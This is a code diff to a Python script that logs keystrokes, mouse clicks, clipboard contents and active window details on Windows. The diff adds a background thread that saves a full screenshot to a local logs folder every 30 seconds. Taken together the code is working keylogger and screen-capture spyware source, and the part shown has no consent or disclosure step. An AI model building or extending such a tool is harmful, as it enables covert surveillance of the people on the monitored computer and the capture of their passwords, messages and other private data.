@@ -2,12 +2,13 @@ import os
 from datetime import datetime
 from pynput import keyboard, mouse
 import platform
-import win32gui  # For active window
-import win32process  # For process details
-import psutil  # To fetch process details
-import pyperclip  # Clipboard monitoring
-import threading  # Separate thread for clipboard monitoring
-import time  # For periodic clipboard checks
+import win32gui
+import win32process
+import psutil
+import pyperclip
+import threading
+import time
+from PIL import ImageGrab  # For taking screenshots
 
 # Create log directory
 log_dir = "logs"
@@ -51,6 +52,18 @@ def monitor_clipboard():
             write_log(f"Error monitoring clipboard: {e}")
         time.sleep(1)  # Check clipboard every second
 
+# Screenshot Capture at intervals
+def capture_screenshot():
+    while True:
+        try:
+            screenshot = ImageGrab.grab()
+            screenshot_path = os.path.join(log_dir, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
+            screenshot.save(screenshot_path)
+            write_log(f"Screenshot captured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        except Exception as e:
+            write_log(f"Error capturing screenshot: {e}")
+        time.sleep(30)  # Capture screenshot every 30 seconds
+
 # Keyboard Listener: Log keystrokes
 def on_key_press(key):
     try:
@@ -74,6 +87,10 @@ def on_click(x, y, button, pressed):
 # Start clipboard monitoring in a separate thread
 clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
 clipboard_thread.start()
+
+# Start screenshot capture in a separate thread
+screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
+screenshot_thread.start()
 
 # Start listeners for both keyboard and mouse
 keyboard_listener = keyboard.Listener(on_press=on_key_press)
